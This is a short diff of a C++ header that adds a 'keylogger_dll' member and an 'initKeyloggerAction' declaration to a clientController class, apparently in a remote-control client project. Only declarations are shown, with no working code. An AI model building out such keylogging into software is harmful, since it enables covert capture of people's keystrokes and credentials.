@@ -9,6 +9,7 @@ class	clientController {
 
 	// Dictionaries
 	Dictionary	sayHello;
+	Dictionary	keylogger_dll;
 
 public:
 
@@ -17,6 +18,7 @@ public:
 
 	int		mainAction(int, char**);
 	void		sayHelloAction(void);
+	void		initKeyloggerAction(void);
 
 };
 
